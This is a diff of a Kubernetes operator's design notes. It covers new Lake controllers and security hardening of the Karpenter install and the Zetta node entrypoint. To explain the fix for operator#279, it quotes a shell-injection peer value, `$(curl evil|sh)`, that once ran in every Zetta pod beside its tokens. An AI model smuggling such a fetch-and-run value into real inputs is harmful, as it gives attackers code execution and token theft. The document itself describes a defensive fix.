@@ -37,7 +37,7 @@ wiring. The `Lake` CR is in production (`Lake/prod` on AKS); see the lake rows b
 | **demoSeed** | `internal/controller/idp.go` | one-shot seed `Job` (placeholder) | ✅ **done** (validated on AKS) |
 | **zetta-capacity** | `internal/controller/zetta_capacity.go` | Karpenter `NodePool` (unstructured, cluster-scoped) + a `PodDisruptionBudget`; pins the Zetta pods onto the pool (taint/toleration + nodeSelector + `do-not-disrupt`) | 🟡 **implemented** (opt-in, [#69](https://github.com/oramasearch/orama-operator/issues/69) first slice; not yet live-tested — needs an EKS/AKS-NAP cluster) |
 | **zetta-capacity-install** | `internal/controller/zetta_capacity_install.go` | Operator-owned **Karpenter install** (cloud-gated): server-side-applies the pinned upstream controller (Deployment + ServiceAccount + RBAC) + Karpenter CRDs, as `unstructured` | 🟡 **implemented** (opt-in `install: true`, [#75](https://github.com/oramasearch/orama-operator/issues/75); EKS self-install, no-op on AKS-NAP/bare-metal; not yet live-tested) |
-| **lake** (liquid project) | `internal/controller/lake_controller.go` | from one cluster-scoped `Lake` CR: Namespace, owned or referenced store PVC, hardened RWO-safe `Recreate` Deployment + conditional PDB + Service, admin-token, instance-KEK and sealing-key Secrets, CNPG control-plane `Cluster` + owned `PostgresSchema` (lake's schema), owned `OramaZettaCluster` data plane, opt-in Barman R2/S3 `ScheduledBackup`, opt-in TLS Ingress + `CloudflareDNSRecord`, Lake-owned environments, and per-data-service lifecycle evidence | ✅ **done** (`Lake/prod` live on AKS; issue #122's rolling proof is superseded by the RWO-safe restart check; issue #125 live Zetta proof is deferred until this controller is deployed; data services remain unmanaged until their required rehearsals pass) — see [`lake/README.md`](lake/README.md), [`lake/backups.md`](lake/backups.md), [`lake/data-services/README.md`](lake/data-services/README.md), and [`lake/sealed-secrets.md`](lake/sealed-secrets.md) |
+| **lake** (liquid project) | `internal/controller/lake_controller.go` | from one cluster-scoped `Lake` CR: Namespace, owned or referenced store PVC, hardened RWO-safe `Recreate` Deployment (pod `ndots:2`, as on agent and app pods, so full Service names resolve on the first query) + conditional PDB + Service, admin-token, instance-KEK and sealing-key Secrets, CNPG control-plane `Cluster` + owned `PostgresSchema` (lake's schema), owned `OramaZettaCluster` data plane, opt-in Barman R2/S3 `ScheduledBackup`, opt-in TLS Ingress + `CloudflareDNSRecord`, Lake-owned environments, and per-data-service lifecycle evidence | ✅ **done** (`Lake/prod` live on AKS; issue #122's rolling proof is superseded by the RWO-safe restart check; issue #125 live Zetta proof is deferred until this controller is deployed; data services remain unmanaged until their required rehearsals pass) — see [`lake/README.md`](lake/README.md), [`lake/backups.md`](lake/backups.md), [`lake/data-services/README.md`](lake/data-services/README.md), and [`lake/sealed-secrets.md`](lake/sealed-secrets.md) |
 | **lake e2e** | `internal/controller/lakee2etest_controller.go` | from one cluster-scoped `LakeE2ETest`: waits for the target Lake, Postgres, and schema, then owns a runner Job in the Lake namespace with the in-cluster URL and unique run identity | 🟡 **implemented** ([#123](https://github.com/oramasearch/orama-operator/issues/123)); fake-client verified, real k0s run deferred — see [`lake/README.md`](lake/README.md#service-e2e) |
 | **lake-environment** | `internal/controller/lakeenvironment_controller.go`, `internal/controller/zetta_deployments.go` | materializes append-only Zetta deployment events into stable Lake-owned `LakeEnvironment` CRs; each creates a PSS-restricted Namespace, default-deny and access NetworkPolicies, ResourceQuota, LimitRange, `untrusted` runtime Deployment, Service, sealed-secret copies with local LakeSealedSecret owners and derived Pod annotations, admission-selecting namespace labels, optional Ingress and named-environment DNS | 🟡 **implemented** ([#124](https://github.com/oramasearch/orama-operator/issues/124), [#142](https://github.com/oramasearch/orama-operator/issues/142)); fake-client, envtest and Zetta-double verified, real liquid→k0s change-page proof deferred — see [`lake/environments.md`](lake/environments.md) |
 | **lake-app** | `internal/controller/lakeapp_controller.go`, `lakeapp_tokens.go` | isolated restricted workload, quota, limits, binding-scoped network access, Deployment, Service and authenticated ingress; generated source/Zetta/event/registry-pull tokens for synchronized apps, rollout gated on hash registration, a merged Docker config for Lake registry pulls, selected Secret keys copied and rendered as `secretKeyRef` environment entries, optional app.toml entrypoint, accurate stopped state and best-effort Lake events; one-release legacy whole-Secret `envFrom` delivery remains supported | 🟡 **implemented** (#193, #194, #221, #241); native envtest covers lifecycle, bindings, secret environment delivery, token and pull-Secret rotation, pod references and namespace/DNS finalization; live app-runtime proof deferred — see [`lake/apps.md`](lake/apps.md) |
@@ -46,6 +46,8 @@ wiring. The `Lake` CR is in production (`Lake/prod` on AKS); see the lake rows b
 | **lake-volume-snapshots** | `internal/controller/lake_volume_snapshots*.go`, `lake_services_notify.go` | opt-in (`spec.snapshots.enabled`) control-Postgres `volume_snapshot_policies` to CSI `VolumeSnapshot`s of lake's store claim and each workspace Zetta's claims: the `Retain` `VolumeSnapshotClass` created when absent, `<claim>-<UTC timestamp>` snapshots on the cron schedule, at first sight and on `requested_at`, pruning beyond `keep`, bound contents labelled with their target, comparison-gated `volume_snapshot_status`; deleted workspaces are left alone; dedicated `lake_volume_snapshots` listener and 60-second poll | 🟡 **implemented** (#260); envtests against the upstream snapshot CRDs and a native SQL fixture; a live snapshot and restore on dev are pending — see [`lake/volume-snapshots.md`](lake/volume-snapshots.md) |
 | **lake builds** | `internal/controller/lake_builds.go`, `internal/controller/lake_builds_pgx.go`, `internal/controller/lake_services_notify.go` | with `Lake.spec.builds.enabled`: injects `LAKE_INTERNAL_URL` for Lake's registry authority, reads queued/cancelled `builds` rows from Lake control Postgres, creates one rootless BuildKit Job and scoped-token Secret in a deterministic per-space namespace, applies default-deny plus Lake/package-index egress, enforces per-Lake and per-space concurrency, sends pod-level progress events, parses the final digest/size from pod logs, and comparison-gates row updates; `LISTEN lake_builds` provides prompt wake-up while polling recovers missed notifications | 🟡 **implemented** ([#195](https://github.com/oramasearch/orama-operator/issues/195)); fake-client, native envtest, and pgx contract coverage; dev-cluster build-and-pull deferred until a published lake-builder image and matching Lake registry endpoints are available — see [`lake/builds.md`](lake/builds.md) |
 | **lake managed services** | `internal/controller/lake_services.go`, `internal/controller/lake_services_pgx.go`, `internal/controller/lake_controller.go` | with `Lake.spec.services.enabled`: polls lake's `services` table over pgx at `spec.deploySync.interval`; owns Zetta, Postgres and catalog service resources, connection delivery, comparison-gated status, deletion and `spec.services.maxServices`, except that it skips the workspace-owned `zetta_service_id`. Workspace synchronization has its own switch, listener and quota. Catalog kinds use their upstream operators; SQLite, DuckDB and Polars use operator-owned wrappers | 🟡 **implemented** (liquid-bridge decisions 46 and 47; #219); fake-store/client, alternating-poll envtest and pgx coverage, selected live service proof, catalog-schema validation — see [`lake/services.md`](lake/services.md) |
+| **lake methodology runs** | `internal/controller/lake_methodology_runs.go`, `internal/controller/lake_methodology_runs_pgx.go` | with `Lake.spec.builds.enabled` and `spec.methodologies.runtimeImage`: reads `methodology_runs` rows with their image build, waits for the build, then runs a stage, a sandbox and a collect Job sharing a per-run PVC in the restricted, default-deny namespace `lake-<name>-methodology-runs`; generates the run's `lmr.` credential (only its SHA-256 is written) and a pull Secret for the built image; the sandbox has no credential, token, service links or network unless granted (public internet only); writes phases, exit code and the sandbox's start and finish to `methodology_run_status` on change, the sandbox's resources to `workload_resources`, and removes the run's objects when it ends | 🟡 **implemented** ([#291](https://github.com/oramasearch/orama-operator/issues/291), [lake#655](https://github.com/oramasearch/lake/issues/655)); fake-client and pgx contract coverage; live run waits for lake#655 and the runtime image — see [`lake/methodology-runs.md`](lake/methodology-runs.md) |
+| **lake workload resources** | `internal/controller/lake_workload_resources.go`, `internal/controller/lake_workload_resources_pgx.go` | on the control-rows poll, at most every 30 seconds per Lake: one `workload_resources` row in the Lake's control Postgres per workspace engine, managed service, app, build, agent launch and agent cron run (lake#658), holding the effective CPU and memory requests (request, else limit; init containers, sidecars and overhead as Kubernetes counts them), GPUs, GPU class (GPU feature discovery's product label, normalized) and VRAM of its scheduled pods; written only on change; a job's row is written from its Job as soon as the Job exists, a finished build or job keeps its values with `pods` 0, and a finished run with no row is backfilled from the pod spec the operator schedules it with (lake#658); rows of objects lake no longer has are deleted | 🟡 **implemented** ([lake#643](https://github.com/oramasearch/lake/issues/643), [lake#658](https://github.com/oramasearch/lake/issues/658)); fake-client and pgx contract coverage; a live run on dev waits for the lake side of lake#643 — see [`lake/workload-resources.md`](lake/workload-resources.md) |
 | **lake Postgres rehearsals** | `internal/controller/lakerestorerehearsal_controller.go` | from one cluster-scoped `LakeRestoreRehearsal`: isolated CNPG backup recovery and data verification for restore; scratch image update then verification for upgrade; CNPG primary switchover then application-Secret connection verification for failover; terminal cleanup and Lake evidence update | ✅ **implemented** — see [`lake/data-services/postgres.md`](lake/data-services/postgres.md) |
 | **lake sealed-secret delivery** | `internal/controller/lakesealedsecret_controller.go` | from one namespaced `LakeSealedSecret`: an owned, cluster-bound Kubernetes Secret labelled `lake.orama.cloud/sealed: "true"`; literal ciphertext opens locally, while lake and dynamic references call lake's mint capability with projected service-account attestation | 🟡 **implemented**; literal delivery and LakeEnvironment consumption with local delivery owners are complete and tested against both k0s admission policies, while lake/dynamic delivery awaits lake's `mint_sealed_secret` leaf |
 | **deployment control plane** | `internal/controller/deployment_controlplane.go` | authenticated liquid REST `/v1` and MCP server; appends immutable Zetta history, desired events and audit entries, validates sealed-secret references, and reads reconciled `LakeEnvironment` status | ✅ **implemented** ([#142](https://github.com/oramasearch/orama-operator/issues/142)); REST/MCP, drift, Zetta-double and envtest coverage — see [`control-plane/README.md`](control-plane/README.md) |
@@ -562,8 +564,20 @@ install** too. Opt-in via `OramaZettaCluster.spec.capacity.karpenter.install` (d
   Deployment + Service + PDB) — and applies each document as an `unstructured` object via **server-side
   apply** (`client.Apply` + force-ownership). **No Karpenter Go types are vendored** (same decoupling as
   the NodePool reconcile). Re-vendor with [`hack/fetch-karpenter-manifests.sh`](../hack/fetch-karpenter-manifests.sh)
-  (a reproducible `helm template` of the upstream OCI charts); two placeholders
-  (`__CLUSTER_NAME__` / `__CONTROLLER_ROLE_ARN__`) are substituted per-CR at apply time.
+  (a reproducible `helm template` of the upstream OCI charts). Two fields carry placeholders
+  (`__CLUSTER_NAME__` / `__CONTROLLER_ROLE_ARN__`); they are **never replaced as text**
+  ([operator#79](https://github.com/oramasearch/orama-operator/issues/79)). The reconciler parses the
+  template first, then sets the CR's values as structured fields: the ServiceAccount's
+  `eks.amazonaws.com/role-arn` annotation and the controller container's `CLUSTER_NAME` env var, each
+  found by kind, name and field path and required to hold its placeholder. The rendered bundle must be
+  exactly the expected 13 objects (`karpenterControllerObjects` in
+  `internal/controller/zetta_capacity_install_render.go`) and the CRD bundle exactly the 4 Karpenter
+  CRDs, or nothing is applied.
+- **Validated inputs** — `installClusterName` must match the EKS cluster-name rule and
+  `controllerRoleARN` must be an IAM role ARN. The CRD schema refuses anything else at admission, and the
+  reconciler checks again (a CR stored before the patterns existed): an invalid value gives
+  `KarpenterInstalled=False, Reason=InvalidInstallSpec` on every cloud, before the finalizer or any object
+  is written.
 - **Cloud-gated** — the cloud is detected from a node's `providerID`:
   - **bare-metal / k0s** (no cloud providerID) ⇒ no-op, `KarpenterInstalled=False, Reason=BareMetalNoCloud`.
   - **AKS** ⇒ no-op, `Reason=ManagedByAKSNAP` — Node Auto Provisioning already deploys and manages
@@ -580,16 +594,22 @@ install** too. Opt-in via `OramaZettaCluster.spec.capacity.karpenter.install` (d
   (`orama.cloud/karpenter-install`) that removes the operator-managed controller resources only when **no
   other** `OramaZettaCluster` still requests the install. **The CRDs are applied but never deleted** on
   teardown — deleting a Karpenter CRD cascades to every `NodePool`/`NodeClaim` in the cluster.
-- **Status** — a `KarpenterInstalled` condition (`BareMetalNoCloud` / `ManagedByAKSNAP` / `UnsupportedCloud`
+- **Status** — a `KarpenterInstalled` condition (`InvalidInstallSpec` / `BareMetalNoCloud` / `ManagedByAKSNAP` / `UnsupportedCloud`
   / `CloudIdentityMissing` / `InstallClusterNameRequired` → `InstallProgressing` → `Installed`), written
   only on change (anti-flap).
 
-> **RBAC (install):** `apiextensions.k8s.io/customresourcedefinitions`
-> (`get;list;watch;create;update;patch` — **no `delete`**, CRDs aren't GC'd) and
-> `rbac.authorization.k8s.io` `clusterroles`/`clusterrolebindings`/`roles`/`rolebindings`
-> (`…;delete;bind;escalate` — creating RBAC that grants Karpenter's broad permissions needs `bind` +
-> `escalate`, since the operator doesn't itself carry every node/pod grant). ServiceAccounts, Deployments,
-> Services and PDBs the install creates are already granted. Mirrored into `chart/templates/rbac.yaml`.
+> **RBAC (install):** `apiextensions.k8s.io/customresourcedefinitions` — `get;list;watch` on all,
+> `create;update;patch` only on the 4 Karpenter CRD names (**no `delete`**, CRDs aren't GC'd). And
+> `rbac.authorization.k8s.io` — `get;list;watch` on all roles and bindings; `create;update;patch;delete`
+> plus `bind;escalate` **only on the bundle's names** (`clusterroles` karpenter, karpenter-admin,
+> karpenter-core; `clusterrolebindings` karpenter, karpenter-core; `roles` and `rolebindings` karpenter,
+> karpenter-dns). Creating RBAC that grants Karpenter's broad permissions needs `bind` + `escalate`, since
+> the operator doesn't itself carry every node/pod grant; scoping them by `resourceNames` means the
+> operator cannot create, bind or escalate any other role, binding or CRD (operator#79,
+> `TestKarpenterInstallEnvtest` proves both halves against a real API server). ServiceAccounts,
+> Deployments, Services and PDBs the install creates are already granted. Mirrored into
+> `chart/templates/rbac.yaml`; `TestChartKarpenterRBACMatchesBundle` keeps the names in step with the
+> bundle, so re-vendoring a Karpenter version that renames an object fails until both are updated.
 
 > **Follow-ups (later slices of #69):** the Zetta→operator signal channel
 > (`orama_control.scale_requests`); drain-safe, quorum-aware scale-down; multi-cluster
@@ -665,9 +685,33 @@ the pod-CIDR-collision undercount #803 fixes can recur). So the entrypoint now r
 iff `zettaReachability` (the single source of truth shared with status + topology) is `dial-out-only`, and
 **`--node-type ephemeral|permanent`** from `spec.ephemeral`. The two are **independent** axes (a private
 permanent home node is `dial-out-only` + `permanent`; burst capacity is `dial-out-only` + `ephemeral`).
-These are FLAGS, so — like `--admin-token` — they require the auth-capable image generation the operator
+These are FLAGS, so they require the auth-capable image generation the operator
 already mandates (post-[#799](https://github.com/oramasearch/zetta/issues/799) travels with #803/#810); an
 older image would crash on the unknown flag. Verify with `SELECT reachability, node_type FROM system.nodes`.
+
+**Zetta node entrypoint: no CR data in shell text** (`internal/controller/zetta_peers.go`,
+[operator#279](https://github.com/oramasearch/orama-operator/issues/279)). The node container runs
+`/bin/sh -c <zettaEntrypointScript>`, a **constant** script — the same bytes for every
+`OramaZettaCluster`, with only Go constants (`/data`, `:7777`, `:4800`) formatted in. A shell is still
+needed for the per-node values only known at run time (the ordinal from `POD_NAME`, `HOST_IP` under
+`hostNetwork`, this node's field of `ZETTA_ADVERTISE_MAP`). Everything variable is data: the container
+**args** are `zetta-entrypoint` (`$0`), the node flags, `--`, then the external peers one per argument; node-0's
+seed address is the env var `ORAMA_ZETTA_SEED` (deliberately not the engine's own `ZETTA_SEED_PEER`); the
+advertise map and tokens are env vars. The admin token is no longer passed as `--admin-token`: argv is
+readable by every process on the node (`/proc/<pid>/cmdline`), and the engine reads `ZETTA_ADMIN_TOKEN` from
+its environment when the flag is absent. `spec.env` cannot set `ORAMA_ZETTA_SEED` or the engine's own
+`ZETTA_SEED_PEER`/`ZETTA_DATA_DIR`. The script grows the argv with `set -- "$@" …` and ends
+with `exec zetta "$@"`, so no value is ever re-parsed, split or globbed. Before #279 the peers were pasted
+into the script, so a peer such as `$(curl evil|sh)` — from `spec.externalPeers` or from any operator able to
+append to the shared topology table — ran in every Zetta pod beside `ZETTA_ADMIN_TOKEN` and
+`ZETTA_CLUSTER_TOKEN`. Peers are also **validated** as `host:port` (CRD pattern + controller): an invalid
+`spec.externalPeers`/`spec.wanAddress` is refused (StatefulSet untouched, `PeerAddressesValid=False`, values
+Go-quoted in the message), an
+invalid topology address is trimmed, then dropped and reported (logged once per change), and resolved advertise addresses are checked before they are
+advertised or written to the topology. For valid input the argv is what the old entrypoint produced minus
+`--admin-token <token>`, and zetta still sees the token in its environment — `TestZettaEntrypointMatchesLegacyArgv` runs both scripts (under `/bin/sh` and dash, the Ubuntu
+image's `/bin/sh`) against a stub `zetta` for every shape and ordinal. Changing the pod template (new
+`command`, `args`, env var) **rolls every Zetta pod once** when an operator with this change first reconciles.
 
 **Cross-cluster topology THROUGH Zetta** (`internal/controller/zetta_topology.go`,
 [operator#105](https://github.com/oramasearch/orama-operator/issues/105)). Instead of an admin
@@ -678,7 +722,9 @@ like `components` — one row per node, namespaced by `operator` + global `clust
 that table across every cluster, and it **reads** the table back (latest-wins per node by `updated_at`) to
 **derive** its `--peer` set from the OTHER slices' wan endpoints. The StatefulSet's `--peer` flags
 (`mutateZettaStatefulSet` → `zettaPeerSet`) are the **union** of `spec.externalPeers` (explicit override —
-wins) and the derived set (deduped, excluding this slice's own nodes/addresses). Failover: a departed wan node
+wins) and the derived set (deduped, excluding this slice's own nodes/addresses); topology rows are untrusted, so a
+derived address that is not a valid `host:port` is dropped and named in `PeerAddressesValid`
+([operator#279](https://github.com/oramasearch/orama-operator/issues/279)). Failover: a departed wan node
 (scale-down / flip to `dial-out-only`) gets a **`status='gone'` marker row** and falls out of the derived set
 next reconcile. Reads go through `zettaSQLQuery` (parses `.value.rows`; sends the admin bearer). **Blocked:**
 removing a departed node from Zetta's own **membership CRDT** node-list is not possible over SQL (append-only)
